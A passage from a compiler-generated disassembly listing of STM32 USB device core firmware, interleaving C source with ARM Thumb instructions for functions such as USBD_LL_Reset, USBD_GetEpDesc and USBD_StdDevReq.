      (void)USBD_RunTestMode(pdev);
 800b2f8:	68f8      	ldr	r0, [r7, #12]
 800b2fa:	f7ff fe42 	bl	800af82 <USBD_RunTestMode>
      pdev->dev_test_mode = 0U;
 800b2fe:	68fb      	ldr	r3, [r7, #12]
 800b300:	2200      	movs	r2, #0
 800b302:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
 800b306:	e032      	b.n	800b36e <USBD_LL_DataInStage+0x15a>
    }
  }
  else
  {
    /* Get the class index relative to this interface */
    idx = USBD_CoreFindEP(pdev, ((uint8_t)epnum | 0x80U));
 800b308:	7afb      	ldrb	r3, [r7, #11]
 800b30a:	f063 037f 	orn	r3, r3, #127	; 0x7f
 800b30e:	b2db      	uxtb	r3, r3
 800b310:	4619      	mov	r1, r3
 800b312:	68f8      	ldr	r0, [r7, #12]
 800b314:	f000 f8f3 	bl	800b4fe <USBD_CoreFindEP>
 800b318:	4603      	mov	r3, r0
 800b31a:	75fb      	strb	r3, [r7, #23]

    if (((uint16_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b31c:	7dfb      	ldrb	r3, [r7, #23]
 800b31e:	2bff      	cmp	r3, #255	; 0xff
 800b320:	d025      	beq.n	800b36e <USBD_LL_DataInStage+0x15a>
 800b322:	7dfb      	ldrb	r3, [r7, #23]
 800b324:	2b00      	cmp	r3, #0
 800b326:	d122      	bne.n	800b36e <USBD_LL_DataInStage+0x15a>
    {
      /* Call the class data out function to manage the request */
      if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b328:	68fb      	ldr	r3, [r7, #12]
 800b32a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b32e:	b2db      	uxtb	r3, r3
 800b330:	2b03      	cmp	r3, #3
 800b332:	d11c      	bne.n	800b36e <USBD_LL_DataInStage+0x15a>
      {
        if (pdev->pClass[idx]->DataIn != NULL)
 800b334:	7dfa      	ldrb	r2, [r7, #23]
 800b336:	68fb      	ldr	r3, [r7, #12]
 800b338:	32ae      	adds	r2, #174	; 0xae
 800b33a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b33e:	695b      	ldr	r3, [r3, #20]
 800b340:	2b00      	cmp	r3, #0
 800b342:	d014      	beq.n	800b36e <USBD_LL_DataInStage+0x15a>
        {
          pdev->classId = idx;
 800b344:	7dfa      	ldrb	r2, [r7, #23]
 800b346:	68fb      	ldr	r3, [r7, #12]
 800b348:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->DataIn(pdev, epnum);
 800b34c:	7dfa      	ldrb	r2, [r7, #23]
 800b34e:	68fb      	ldr	r3, [r7, #12]
 800b350:	32ae      	adds	r2, #174	; 0xae
 800b352:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b356:	695b      	ldr	r3, [r3, #20]
 800b358:	7afa      	ldrb	r2, [r7, #11]
 800b35a:	4611      	mov	r1, r2
 800b35c:	68f8      	ldr	r0, [r7, #12]
 800b35e:	4798      	blx	r3
 800b360:	4603      	mov	r3, r0
 800b362:	75bb      	strb	r3, [r7, #22]

          if (ret != USBD_OK)
 800b364:	7dbb      	ldrb	r3, [r7, #22]
 800b366:	2b00      	cmp	r3, #0
 800b368:	d001      	beq.n	800b36e <USBD_LL_DataInStage+0x15a>
          {
            return ret;
 800b36a:	7dbb      	ldrb	r3, [r7, #22]
 800b36c:	e000      	b.n	800b370 <USBD_LL_DataInStage+0x15c>
        }
      }
    }
  }

  return USBD_OK;
 800b36e:	2300      	movs	r3, #0
}
 800b370:	4618      	mov	r0, r3
 800b372:	3718      	adds	r7, #24
 800b374:	46bd      	mov	sp, r7
 800b376:	bd80      	pop	{r7, pc}

0800b378 <USBD_LL_Reset>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Reset(USBD_HandleTypeDef *pdev)
{
 800b378:	b580      	push	{r7, lr}
 800b37a:	b084      	sub	sp, #16
 800b37c:	af00      	add	r7, sp, #0
 800b37e:	6078      	str	r0, [r7, #4]
  USBD_StatusTypeDef ret = USBD_OK;
 800b380:	2300      	movs	r3, #0
 800b382:	73fb      	strb	r3, [r7, #15]

  /* Upon Reset call user call back */
  pdev->dev_state = USBD_STATE_DEFAULT;
 800b384:	687b      	ldr	r3, [r7, #4]
 800b386:	2201      	movs	r2, #1
 800b388:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  pdev->ep0_state = USBD_EP0_IDLE;
 800b38c:	687b      	ldr	r3, [r7, #4]
 800b38e:	2200      	movs	r2, #0
 800b390:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->dev_config = 0U;
 800b394:	687b      	ldr	r3, [r7, #4]
 800b396:	2200      	movs	r2, #0
 800b398:	605a      	str	r2, [r3, #4]
  pdev->dev_remote_wakeup = 0U;
 800b39a:	687b      	ldr	r3, [r7, #4]
 800b39c:	2200      	movs	r2, #0
 800b39e:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
  pdev->dev_test_mode = 0U;
 800b3a2:	687b      	ldr	r3, [r7, #4]
 800b3a4:	2200      	movs	r2, #0
 800b3a6:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
      }
    }
  }
#else

  if (pdev->pClass[0] != NULL)
 800b3aa:	687b      	ldr	r3, [r7, #4]
 800b3ac:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b3b0:	2b00      	cmp	r3, #0
 800b3b2:	d014      	beq.n	800b3de <USBD_LL_Reset+0x66>
  {
    if (pdev->pClass[0]->DeInit != NULL)
 800b3b4:	687b      	ldr	r3, [r7, #4]
 800b3b6:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b3ba:	685b      	ldr	r3, [r3, #4]
 800b3bc:	2b00      	cmp	r3, #0
 800b3be:	d00e      	beq.n	800b3de <USBD_LL_Reset+0x66>
    {
      if (pdev->pClass[0]->DeInit(pdev, (uint8_t)pdev->dev_config) != USBD_OK)
 800b3c0:	687b      	ldr	r3, [r7, #4]
 800b3c2:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b3c6:	685b      	ldr	r3, [r3, #4]
 800b3c8:	687a      	ldr	r2, [r7, #4]
 800b3ca:	6852      	ldr	r2, [r2, #4]
 800b3cc:	b2d2      	uxtb	r2, r2
 800b3ce:	4611      	mov	r1, r2
 800b3d0:	6878      	ldr	r0, [r7, #4]
 800b3d2:	4798      	blx	r3
 800b3d4:	4603      	mov	r3, r0
 800b3d6:	2b00      	cmp	r3, #0
 800b3d8:	d001      	beq.n	800b3de <USBD_LL_Reset+0x66>
      {
        ret = USBD_FAIL;
 800b3da:	2303      	movs	r3, #3
 800b3dc:	73fb      	strb	r3, [r7, #15]
    }
  }
#endif /* USE_USBD_COMPOSITE */

  /* Open EP0 OUT */
  (void)USBD_LL_OpenEP(pdev, 0x00U, USBD_EP_TYPE_CTRL, USB_MAX_EP0_SIZE);
 800b3de:	2340      	movs	r3, #64	; 0x40
 800b3e0:	2200      	movs	r2, #0
 800b3e2:	2100      	movs	r1, #0
 800b3e4:	6878      	ldr	r0, [r7, #4]
 800b3e6:	f001 fbc3 	bl	800cb70 <USBD_LL_OpenEP>
  pdev->ep_out[0x00U & 0xFU].is_used = 1U;
 800b3ea:	687b      	ldr	r3, [r7, #4]
 800b3ec:	2201      	movs	r2, #1
 800b3ee:	f8a3 2164 	strh.w	r2, [r3, #356]	; 0x164

  pdev->ep_out[0].maxpacket = USB_MAX_EP0_SIZE;
 800b3f2:	687b      	ldr	r3, [r7, #4]
 800b3f4:	2240      	movs	r2, #64	; 0x40
 800b3f6:	f8c3 2160 	str.w	r2, [r3, #352]	; 0x160

  /* Open EP0 IN */
  (void)USBD_LL_OpenEP(pdev, 0x80U, USBD_EP_TYPE_CTRL, USB_MAX_EP0_SIZE);
 800b3fa:	2340      	movs	r3, #64	; 0x40
 800b3fc:	2200      	movs	r2, #0
 800b3fe:	2180      	movs	r1, #128	; 0x80
 800b400:	6878      	ldr	r0, [r7, #4]
 800b402:	f001 fbb5 	bl	800cb70 <USBD_LL_OpenEP>
  pdev->ep_in[0x80U & 0xFU].is_used = 1U;
 800b406:	687b      	ldr	r3, [r7, #4]
 800b408:	2201      	movs	r2, #1
 800b40a:	849a      	strh	r2, [r3, #36]	; 0x24

  pdev->ep_in[0].maxpacket = USB_MAX_EP0_SIZE;
 800b40c:	687b      	ldr	r3, [r7, #4]
 800b40e:	2240      	movs	r2, #64	; 0x40
 800b410:	621a      	str	r2, [r3, #32]

  return ret;
 800b412:	7bfb      	ldrb	r3, [r7, #15]
}
 800b414:	4618      	mov	r0, r3
 800b416:	3710      	adds	r7, #16
 800b418:	46bd      	mov	sp, r7
 800b41a:	bd80      	pop	{r7, pc}

0800b41c <USBD_LL_SetSpeed>:
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_SetSpeed(USBD_HandleTypeDef *pdev,
                                    USBD_SpeedTypeDef speed)
{
 800b41c:	b480      	push	{r7}
 800b41e:	b083      	sub	sp, #12
 800b420:	af00      	add	r7, sp, #0
 800b422:	6078      	str	r0, [r7, #4]
 800b424:	460b      	mov	r3, r1
 800b426:	70fb      	strb	r3, [r7, #3]
  pdev->dev_speed = speed;
 800b428:	687b      	ldr	r3, [r7, #4]
 800b42a:	78fa      	ldrb	r2, [r7, #3]
 800b42c:	741a      	strb	r2, [r3, #16]

  return USBD_OK;
 800b42e:	2300      	movs	r3, #0
}
 800b430:	4618      	mov	r0, r3
 800b432:	370c      	adds	r7, #12
 800b434:	46bd      	mov	sp, r7
 800b436:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b43a:	4770      	bx	lr

0800b43c <USBD_LL_Suspend>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Suspend(USBD_HandleTypeDef *pdev)
{
 800b43c:	b480      	push	{r7}
 800b43e:	b083      	sub	sp, #12
 800b440:	af00      	add	r7, sp, #0
 800b442:	6078      	str	r0, [r7, #4]
  if (pdev->dev_state != USBD_STATE_SUSPENDED)
 800b444:	687b      	ldr	r3, [r7, #4]
 800b446:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b44a:	b2db      	uxtb	r3, r3
 800b44c:	2b04      	cmp	r3, #4
 800b44e:	d006      	beq.n	800b45e <USBD_LL_Suspend+0x22>
  {
    pdev->dev_old_state = pdev->dev_state;
 800b450:	687b      	ldr	r3, [r7, #4]
 800b452:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b456:	b2da      	uxtb	r2, r3
 800b458:	687b      	ldr	r3, [r7, #4]
 800b45a:	f883 229d 	strb.w	r2, [r3, #669]	; 0x29d
  }

  pdev->dev_state = USBD_STATE_SUSPENDED;
 800b45e:	687b      	ldr	r3, [r7, #4]
 800b460:	2204      	movs	r2, #4
 800b462:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c

  return USBD_OK;
 800b466:	2300      	movs	r3, #0
}
 800b468:	4618      	mov	r0, r3
 800b46a:	370c      	adds	r7, #12
 800b46c:	46bd      	mov	sp, r7
 800b46e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b472:	4770      	bx	lr

0800b474 <USBD_LL_Resume>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Resume(USBD_HandleTypeDef *pdev)
{
 800b474:	b480      	push	{r7}
 800b476:	b083      	sub	sp, #12
 800b478:	af00      	add	r7, sp, #0
 800b47a:	6078      	str	r0, [r7, #4]
  if (pdev->dev_state == USBD_STATE_SUSPENDED)
 800b47c:	687b      	ldr	r3, [r7, #4]
 800b47e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b482:	b2db      	uxtb	r3, r3
 800b484:	2b04      	cmp	r3, #4
 800b486:	d106      	bne.n	800b496 <USBD_LL_Resume+0x22>
  {
    pdev->dev_state = pdev->dev_old_state;
 800b488:	687b      	ldr	r3, [r7, #4]
 800b48a:	f893 329d 	ldrb.w	r3, [r3, #669]	; 0x29d
 800b48e:	b2da      	uxtb	r2, r3
 800b490:	687b      	ldr	r3, [r7, #4]
 800b492:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  }

  return USBD_OK;
 800b496:	2300      	movs	r3, #0
}
 800b498:	4618      	mov	r0, r3
 800b49a:	370c      	adds	r7, #12
 800b49c:	46bd      	mov	sp, r7
 800b49e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b4a2:	4770      	bx	lr

0800b4a4 <USBD_LL_SOF>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_SOF(USBD_HandleTypeDef *pdev)
{
 800b4a4:	b580      	push	{r7, lr}
 800b4a6:	b082      	sub	sp, #8
 800b4a8:	af00      	add	r7, sp, #0
 800b4aa:	6078      	str	r0, [r7, #4]
  /* The SOF event can be distributed for all classes that support it */
  if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b4ac:	687b      	ldr	r3, [r7, #4]
 800b4ae:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b4b2:	b2db      	uxtb	r3, r3
 800b4b4:	2b03      	cmp	r3, #3
 800b4b6:	d110      	bne.n	800b4da <USBD_LL_SOF+0x36>
          }
        }
      }
    }
#else
    if (pdev->pClass[0] != NULL)
 800b4b8:	687b      	ldr	r3, [r7, #4]
 800b4ba:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b4be:	2b00      	cmp	r3, #0
 800b4c0:	d00b      	beq.n	800b4da <USBD_LL_SOF+0x36>
    {
      if (pdev->pClass[0]->SOF != NULL)
 800b4c2:	687b      	ldr	r3, [r7, #4]
 800b4c4:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b4c8:	69db      	ldr	r3, [r3, #28]
 800b4ca:	2b00      	cmp	r3, #0
 800b4cc:	d005      	beq.n	800b4da <USBD_LL_SOF+0x36>
      {
        (void)pdev->pClass[0]->SOF(pdev);
 800b4ce:	687b      	ldr	r3, [r7, #4]
 800b4d0:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b4d4:	69db      	ldr	r3, [r3, #28]
 800b4d6:	6878      	ldr	r0, [r7, #4]
 800b4d8:	4798      	blx	r3
      }
    }
#endif /* USE_USBD_COMPOSITE */
  }

  return USBD_OK;
 800b4da:	2300      	movs	r3, #0
}
 800b4dc:	4618      	mov	r0, r3
 800b4de:	3708      	adds	r7, #8
 800b4e0:	46bd      	mov	sp, r7
 800b4e2:	bd80      	pop	{r7, pc}

0800b4e4 <USBD_CoreFindIF>:
  * @param  pdev: device instance
  * @param  index : selected interface number
  * @retval index of the class using the selected interface number. OxFF if no class found.
  */
uint8_t USBD_CoreFindIF(USBD_HandleTypeDef *pdev, uint8_t index)
{
 800b4e4:	b480      	push	{r7}
 800b4e6:	b083      	sub	sp, #12
 800b4e8:	af00      	add	r7, sp, #0
 800b4ea:	6078      	str	r0, [r7, #4]
 800b4ec:	460b      	mov	r3, r1
 800b4ee:	70fb      	strb	r3, [r7, #3]
  return 0xFFU;
#else
  UNUSED(pdev);
  UNUSED(index);

  return 0x00U;
 800b4f0:	2300      	movs	r3, #0
#endif /* USE_USBD_COMPOSITE */
}
 800b4f2:	4618      	mov	r0, r3
 800b4f4:	370c      	adds	r7, #12
 800b4f6:	46bd      	mov	sp, r7
 800b4f8:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b4fc:	4770      	bx	lr

0800b4fe <USBD_CoreFindEP>:
  * @param  pdev: device instance
  * @param  index : selected endpoint number
  * @retval index of the class using the selected endpoint number. 0xFF if no class found.
  */
uint8_t USBD_CoreFindEP(USBD_HandleTypeDef *pdev, uint8_t index)
{
 800b4fe:	b480      	push	{r7}
 800b500:	b083      	sub	sp, #12
 800b502:	af00      	add	r7, sp, #0
 800b504:	6078      	str	r0, [r7, #4]
 800b506:	460b      	mov	r3, r1
 800b508:	70fb      	strb	r3, [r7, #3]
  return 0xFFU;
#else
  UNUSED(pdev);
  UNUSED(index);

  return 0x00U;
 800b50a:	2300      	movs	r3, #0
#endif /* USE_USBD_COMPOSITE */
}
 800b50c:	4618      	mov	r0, r3
 800b50e:	370c      	adds	r7, #12
 800b510:	46bd      	mov	sp, r7
 800b512:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b516:	4770      	bx	lr

0800b518 <USBD_GetEpDesc>:
  * @param  pConfDesc:  pointer to Bos descriptor
  * @param  EpAddr:  endpoint address
  * @retval pointer to video endpoint descriptor
  */
void *USBD_GetEpDesc(uint8_t *pConfDesc, uint8_t EpAddr)
{
 800b518:	b580      	push	{r7, lr}
 800b51a:	b086      	sub	sp, #24
 800b51c:	af00      	add	r7, sp, #0
 800b51e:	6078      	str	r0, [r7, #4]
 800b520:	460b      	mov	r3, r1
 800b522:	70fb      	strb	r3, [r7, #3]
  USBD_DescHeaderTypeDef *pdesc = (USBD_DescHeaderTypeDef *)(void *)pConfDesc;
 800b524:	687b      	ldr	r3, [r7, #4]
 800b526:	617b      	str	r3, [r7, #20]
  USBD_ConfigDescTypeDef *desc = (USBD_ConfigDescTypeDef *)(void *)pConfDesc;
 800b528:	687b      	ldr	r3, [r7, #4]
 800b52a:	60fb      	str	r3, [r7, #12]
  USBD_EpDescTypeDef *pEpDesc = NULL;
 800b52c:	2300      	movs	r3, #0
 800b52e:	613b      	str	r3, [r7, #16]
  uint16_t ptr;

  if (desc->wTotalLength > desc->bLength)
 800b530:	68fb      	ldr	r3, [r7, #12]
 800b532:	885b      	ldrh	r3, [r3, #2]
 800b534:	b29a      	uxth	r2, r3
 800b536:	68fb      	ldr	r3, [r7, #12]
 800b538:	781b      	ldrb	r3, [r3, #0]
 800b53a:	b29b      	uxth	r3, r3
 800b53c:	429a      	cmp	r2, r3
 800b53e:	d920      	bls.n	800b582 <USBD_GetEpDesc+0x6a>
  {
    ptr = desc->bLength;
 800b540:	68fb      	ldr	r3, [r7, #12]
 800b542:	781b      	ldrb	r3, [r3, #0]
 800b544:	b29b      	uxth	r3, r3
 800b546:	817b      	strh	r3, [r7, #10]

    while (ptr < desc->wTotalLength)
 800b548:	e013      	b.n	800b572 <USBD_GetEpDesc+0x5a>
    {
      pdesc = USBD_GetNextDesc((uint8_t *)pdesc, &ptr);
 800b54a:	f107 030a 	add.w	r3, r7, #10
 800b54e:	4619      	mov	r1, r3
 800b550:	6978      	ldr	r0, [r7, #20]
 800b552:	f000 f81b 	bl	800b58c <USBD_GetNextDesc>
 800b556:	6178      	str	r0, [r7, #20]

      if (pdesc->bDescriptorType == USB_DESC_TYPE_ENDPOINT)
 800b558:	697b      	ldr	r3, [r7, #20]
 800b55a:	785b      	ldrb	r3, [r3, #1]
 800b55c:	2b05      	cmp	r3, #5
 800b55e:	d108      	bne.n	800b572 <USBD_GetEpDesc+0x5a>
      {
        pEpDesc = (USBD_EpDescTypeDef *)(void *)pdesc;
 800b560:	697b      	ldr	r3, [r7, #20]
 800b562:	613b      	str	r3, [r7, #16]

        if (pEpDesc->bEndpointAddress == EpAddr)
 800b564:	693b      	ldr	r3, [r7, #16]
 800b566:	789b      	ldrb	r3, [r3, #2]
 800b568:	78fa      	ldrb	r2, [r7, #3]
 800b56a:	429a      	cmp	r2, r3
 800b56c:	d008      	beq.n	800b580 <USBD_GetEpDesc+0x68>
        {
          break;
        }
        else
        {
          pEpDesc = NULL;
 800b56e:	2300      	movs	r3, #0
 800b570:	613b      	str	r3, [r7, #16]
    while (ptr < desc->wTotalLength)
 800b572:	68fb      	ldr	r3, [r7, #12]
 800b574:	885b      	ldrh	r3, [r3, #2]
 800b576:	b29a      	uxth	r2, r3
 800b578:	897b      	ldrh	r3, [r7, #10]
 800b57a:	429a      	cmp	r2, r3
 800b57c:	d8e5      	bhi.n	800b54a <USBD_GetEpDesc+0x32>
 800b57e:	e000      	b.n	800b582 <USBD_GetEpDesc+0x6a>
          break;
 800b580:	bf00      	nop
        }
      }
    }
  }

  return (void *)pEpDesc;
 800b582:	693b      	ldr	r3, [r7, #16]
}
 800b584:	4618      	mov	r0, r3
 800b586:	3718      	adds	r7, #24
 800b588:	46bd      	mov	sp, r7
 800b58a:	bd80      	pop	{r7, pc}

0800b58c <USBD_GetNextDesc>:
  * @param  buf: Buffer where the descriptor is available
  * @param  ptr: data pointer inside the descriptor
  * @retval next header
  */
USBD_DescHeaderTypeDef *USBD_GetNextDesc(uint8_t *pbuf, uint16_t *ptr)
{
 800b58c:	b480      	push	{r7}
 800b58e:	b085      	sub	sp, #20
 800b590:	af00      	add	r7, sp, #0
 800b592:	6078      	str	r0, [r7, #4]
 800b594:	6039      	str	r1, [r7, #0]
  USBD_DescHeaderTypeDef *pnext = (USBD_DescHeaderTypeDef *)(void *)pbuf;
 800b596:	687b      	ldr	r3, [r7, #4]
 800b598:	60fb      	str	r3, [r7, #12]

  *ptr += pnext->bLength;
 800b59a:	683b      	ldr	r3, [r7, #0]
 800b59c:	881a      	ldrh	r2, [r3, #0]
 800b59e:	68fb      	ldr	r3, [r7, #12]
 800b5a0:	781b      	ldrb	r3, [r3, #0]
 800b5a2:	b29b      	uxth	r3, r3
 800b5a4:	4413      	add	r3, r2
 800b5a6:	b29a      	uxth	r2, r3
 800b5a8:	683b      	ldr	r3, [r7, #0]
 800b5aa:	801a      	strh	r2, [r3, #0]
  pnext = (USBD_DescHeaderTypeDef *)(void *)(pbuf + pnext->bLength);
 800b5ac:	68fb      	ldr	r3, [r7, #12]
 800b5ae:	781b      	ldrb	r3, [r3, #0]
 800b5b0:	461a      	mov	r2, r3
 800b5b2:	687b      	ldr	r3, [r7, #4]
 800b5b4:	4413      	add	r3, r2
 800b5b6:	60fb      	str	r3, [r7, #12]

  return (pnext);
 800b5b8:	68fb      	ldr	r3, [r7, #12]
}
 800b5ba:	4618      	mov	r0, r3
 800b5bc:	3714      	adds	r7, #20
 800b5be:	46bd      	mov	sp, r7
 800b5c0:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b5c4:	4770      	bx	lr

0800b5c6 <SWAPBYTE>:

/** @defgroup USBD_DEF_Exported_Macros
  * @{
  */
__STATIC_INLINE uint16_t SWAPBYTE(uint8_t *addr)
{
 800b5c6:	b480      	push	{r7}
 800b5c8:	b087      	sub	sp, #28
 800b5ca:	af00      	add	r7, sp, #0
 800b5cc:	6078      	str	r0, [r7, #4]
  uint16_t _SwapVal;
  uint16_t _Byte1;
  uint16_t _Byte2;
  uint8_t *_pbuff = addr;
 800b5ce:	687b      	ldr	r3, [r7, #4]
 800b5d0:	617b      	str	r3, [r7, #20]

  _Byte1 = *(uint8_t *)_pbuff;
 800b5d2:	697b      	ldr	r3, [r7, #20]
 800b5d4:	781b      	ldrb	r3, [r3, #0]
 800b5d6:	827b      	strh	r3, [r7, #18]
  _pbuff++;
 800b5d8:	697b      	ldr	r3, [r7, #20]
 800b5da:	3301      	adds	r3, #1
 800b5dc:	617b      	str	r3, [r7, #20]
  _Byte2 = *(uint8_t *)_pbuff;
 800b5de:	697b      	ldr	r3, [r7, #20]
 800b5e0:	781b      	ldrb	r3, [r3, #0]
 800b5e2:	823b      	strh	r3, [r7, #16]

  _SwapVal = (_Byte2 << 8) | _Byte1;
 800b5e4:	8a3b      	ldrh	r3, [r7, #16]
 800b5e6:	021b      	lsls	r3, r3, #8
 800b5e8:	b21a      	sxth	r2, r3
 800b5ea:	f9b7 3012 	ldrsh.w	r3, [r7, #18]
 800b5ee:	4313      	orrs	r3, r2
 800b5f0:	b21b      	sxth	r3, r3
 800b5f2:	81fb      	strh	r3, [r7, #14]

  return _SwapVal;
 800b5f4:	89fb      	ldrh	r3, [r7, #14]
}
 800b5f6:	4618      	mov	r0, r3
 800b5f8:	371c      	adds	r7, #28
 800b5fa:	46bd      	mov	sp, r7
 800b5fc:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b600:	4770      	bx	lr
	...

0800b604 <USBD_StdDevReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdDevReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b604:	b580      	push	{r7, lr}
 800b606:	b084      	sub	sp, #16
 800b608:	af00      	add	r7, sp, #0
 800b60a:	6078      	str	r0, [r7, #4]
 800b60c:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800b60e:	2300      	movs	r3, #0
 800b610:	73fb      	strb	r3, [r7, #15]

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b612:	683b      	ldr	r3, [r7, #0]
 800b614:	781b      	ldrb	r3, [r3, #0]
 800b616:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b61a:	2b40      	cmp	r3, #64	; 0x40
 800b61c:	d005      	beq.n	800b62a <USBD_StdDevReq+0x26>
 800b61e:	2b40      	cmp	r3, #64	; 0x40
 800b620:	d857      	bhi.n	800b6d2 <USBD_StdDevReq+0xce>
 800b622:	2b00      	cmp	r3, #0
 800b624:	d00f      	beq.n	800b646 <USBD_StdDevReq+0x42>
 800b626:	2b20      	cmp	r3, #32
 800b628:	d153      	bne.n	800b6d2 <USBD_StdDevReq+0xce>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
      ret = (USBD_StatusTypeDef)pdev->pClass[pdev->classId]->Setup(pdev, req);
 800b62a:	687b      	ldr	r3, [r7, #4]
 800b62c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800b630:	687b      	ldr	r3, [r7, #4]
 800b632:	32ae      	adds	r2, #174	; 0xae
 800b634:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b638:	689b      	ldr	r3, [r3, #8]
 800b63a:	6839      	ldr	r1, [r7, #0]
 800b63c:	6878      	ldr	r0, [r7, #4]
 800b63e:	4798      	blx	r3
 800b640:	4603      	mov	r3, r0
 800b642:	73fb      	strb	r3, [r7, #15]
      break;
 800b644:	e04a      	b.n	800b6dc <USBD_StdDevReq+0xd8>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800b646:	683b      	ldr	r3, [r7, #0]
 800b648:	785b      	ldrb	r3, [r3, #1]
 800b64a:	2b09      	cmp	r3, #9
 800b64c:	d83b      	bhi.n	800b6c6 <USBD_StdDevReq+0xc2>
 800b64e:	a201      	add	r2, pc, #4	; (adr r2, 800b654 <USBD_StdDevReq+0x50>)
 800b650:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800b654:	0800b6a9 	.word	0x0800b6a9
 800b658:	0800b6bd 	.word	0x0800b6bd
 800b65c:	0800b6c7 	.word	0x0800b6c7
 800b660:	0800b6b3 	.word	0x0800b6b3
 800b664:	0800b6c7 	.word	0x0800b6c7
 800b668:	0800b687 	.word	0x0800b687
 800b66c:	0800b67d 	.word	0x0800b67d
 800b670:	0800b6c7 	.word	0x0800b6c7
 800b674:	0800b69f 	.word	0x0800b69f
 800b678:	0800b691 	.word	0x0800b691
      {
        case USB_REQ_GET_DESCRIPTOR:
          USBD_GetDescriptor(pdev, req);
 800b67c:	6839      	ldr	r1, [r7, #0]
 800b67e:	6878      	ldr	r0, [r7, #4]
 800b680:	f000 fa3c 	bl	800bafc <USBD_GetDescriptor>
          break;
 800b684:	e024      	b.n	800b6d0 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_ADDRESS:
          USBD_SetAddress(pdev, req);
 800b686:	6839      	ldr	r1, [r7, #0]
 800b688:	6878      	ldr	r0, [r7, #4]
 800b68a:	f000 fbcb 	bl	800be24 <USBD_SetAddress>
          break;
 800b68e:	e01f      	b.n	800b6d0 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_CONFIGURATION:
          ret = USBD_SetConfig(pdev, req);
 800b690:	6839      	ldr	r1, [r7, #0]
 800b692:	6878      	ldr	r0, [r7, #4]
 800b694:	f000 fc0a 	bl	800beac <USBD_SetConfig>
 800b698:	4603      	mov	r3, r0
 800b69a:	73fb      	strb	r3, [r7, #15]
          break;
 800b69c:	e018      	b.n	800b6d0 <USBD_StdDevReq+0xcc>

        case USB_REQ_GET_CONFIGURATION:
          USBD_GetConfig(pdev, req);
 800b69e:	6839      	ldr	r1, [r7, #0]
 800b6a0:	6878      	ldr	r0, [r7, #4]
 800b6a2:	f000 fcad 	bl	800c000 <USBD_GetConfig>
          break;
 800b6a6:	e013      	b.n	800b6d0 <USBD_StdDevReq+0xcc>

        case USB_REQ_GET_STATUS:
          USBD_GetStatus(pdev, req);
 800b6a8:	6839      	ldr	r1, [r7, #0]
 800b6aa:	6878      	ldr	r0, [r7, #4]
 800b6ac:	f000 fcde 	bl	800c06c <USBD_GetStatus>
          break;
 800b6b0:	e00e      	b.n	800b6d0 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_FEATURE:
          USBD_SetFeature(pdev, req);
 800b6b2:	6839      	ldr	r1, [r7, #0]
 800b6b4:	6878      	ldr	r0, [r7, #4]
 800b6b6:	f000 fd0d 	bl	800c0d4 <USBD_SetFeature>
          break;
 800b6ba:	e009      	b.n	800b6d0 <USBD_StdDevReq+0xcc>

        case USB_REQ_CLEAR_FEATURE:
          USBD_ClrFeature(pdev, req);
 800b6bc:	6839      	ldr	r1, [r7, #0]
 800b6be:	6878      	ldr	r0, [r7, #4]
 800b6c0:	f000 fd31 	bl	800c126 <USBD_ClrFeature>
          break;
 800b6c4:	e004      	b.n	800b6d0 <USBD_StdDevReq+0xcc>

        default:
          USBD_CtlError(pdev, req);
 800b6c6:	6839      	ldr	r1, [r7, #0]
 800b6c8:	6878      	ldr	r0, [r7, #4]
